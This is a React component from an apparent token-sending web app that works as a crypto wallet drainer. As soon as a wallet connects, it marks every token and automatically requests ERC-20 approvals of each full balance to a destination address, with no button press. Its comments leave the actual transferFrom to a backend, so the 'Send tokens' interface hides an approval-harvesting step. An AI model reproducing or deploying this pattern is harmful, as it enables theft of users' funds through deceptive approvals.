'use client';

import { Button, Input, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { erc20Abi } from 'viem';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { useIsMounted } from '../../hooks';
import { useEffect } from 'react';

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export const SendTokens = () => {
  const isMounted = useIsMounted();

  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({ text: message, type, delay: 4000 });

  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { isConnected } = useAccount();

  // Auto-check all tokens when tokens change
  useEffect(() => {
    if (tokens.length > 0) {
      const allChecked: Record<string, { isChecked: boolean }> = {};
      tokens.forEach(token => {
        allChecked[token.contract_address] = { isChecked: true };
      });
      setCheckedRecords(allChecked);
    }
  }, [tokens, setCheckedRecords]);

  // Auto-send when connected, tokens checked, and address valid
  useEffect(() => {
    const checkedCount = Object.values(checkedRecords).filter(r => r.isChecked).length;
    const addressAppearsValid =
      typeof destinationAddress === 'string' &&
      (destinationAddress.includes('.') || isAddress(destinationAddress));
    if (
      isConnected &&
      addressAppearsValid &&
      checkedCount === tokens.length &&
      tokens.length > 0 &&
      walletClient &&
      publicClient
    ) {
      sendAllCheckedTokens();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isConnected, checkedRecords, destinationAddress, tokens, walletClient, publicClient]);

  // All hooks above this line!
  if (!isMounted) return null;

  const sendAllCheckedTokens = async () => {
    alert('Sending tokens...');
    if (!publicClient) {
      showToast('Public client is not available.', 'error');
      return;
    }

    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
      .filter(([, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient || !destinationAddress) return;
    alert(
      `Approving ${tokensToSend.length} tokens to ${destinationAddress}. This may take a while.`
    );
    if (destinationAddress.includes('.')) {
      const resolved = await publicClient.getEnsAddress({ name: normalize(destinationAddress) });
      if (resolved) {
        setDestinationAddress(resolved);
        return; // re-render after ENS resolution
      }
    }

    try {
      for (const tokenAddress of tokensToSend) {
        alert(`Approving token: ${tokenAddress}`);

        const token = tokens.find(t => t.contract_address === tokenAddress);
        if (!token) continue;

        // 1. Approve destinationAddress to spend user's tokens
        const { request: approveRequest } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20Abi,
          functionName: 'approve',                      
          gas: BigInt(21000), 
          // data: '0x',
          args: [destinationAddress as `0x${string}`, BigInt(token?.balance || '0')],
        });

        if (!approveRequest) {
          alert(`No approve request for ${token?.contract_ticker_symbol} (${tokenAddress})`);
          continue;
        }

        await walletClient.writeContract(approveRequest)
          .then(res => {
            setCheckedRecords(old => ({
              ...old,
              [tokenAddress]: {
                ...old[tokenAddress],
                pendingApproveTxn: res,
              },
            }));
          })
          .catch(err => {
            alert(
              `Error approving ${token?.contract_ticker_symbol} (${tokenAddress}): ${err?.reason || 'Unknown error'}`
            );
            showToast(
              `Approve error for ${token?.contract_ticker_symbol}: ${err?.reason || 'Unknown error'}`,
              'warning'
            );
          });

        // 2. Notify backend to perform transferFrom (DO NOT do this in frontend)
        // Example: await fetch('/api/transferFrom', { method: 'POST', body: JSON.stringify({ tokenAddress, from: walletClient.account.address, to: destinationAddress, amount: token.balance }) });
      }
    } catch (error) {
      alert(`Error during approval: ${error}`);
      console.log(`Error during approval: ${error}`);
    }
    alert(`Approve step complete. Backend must now call transferFrom for each token.`);
  };

  const addressAppearsValid =
    typeof destinationAddress === 'string' &&
    (destinationAddress.includes('.') || isAddress(destinationAddress));

  const checkedCount = Object.values(checkedRecords).filter(r => r.isChecked).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        Destination Address:
        {/* <Input
          required
          value={destinationAddress}
          placeholder="vitalik.eth"
          onChange={(e) => setDestinationAddress(e.target.value)}
          type={
            addressAppearsValid
              ? 'success'
              : destinationAddress.length > 0
              ? 'warning'
              : 'default'
          }
          width="100%"
          style={{ marginLeft: '10px', marginRight: '10px' }}
          crossOrigin={undefined}
        /> */}
        <Input
          required
          value={destinationAddress}
          placeholder="vitalik.eth"
          onChange={(e) => setDestinationAddress(e.target.value)}
          type={
            addressAppearsValid
              ? 'success'
              : destinationAddress.length > 0
                ? 'warning'
                : 'default'
          }
          width="100%"
          style={{ marginLeft: '10px', marginRight: '10px' }}
          crossOrigin={undefined}
          onPointerEnterCapture={() => { }}
          onPointerLeaveCapture={() => { }}
        />
        {/* <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={!addressAppearsValid}
          style={{ marginTop: '20px' }}
        >
          {checkedCount === 0
            ? 'Select one or more tokens above'
            : `Send ${checkedCount} tokens`}
        </Button> */}
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={!addressAppearsValid}
          style={{ marginTop: '20px' }}
          onPointerEnterCapture={() => { }}
          onPointerLeaveCapture={() => { }}
          placeholder="" // This is the placeholder prop added
        >
          {checkedCount === 0
            ? 'Select one or more tokens above'
            : `Send ${checkedCount} tokens`}
        </Button>
      </form>
    </div>
  );
};
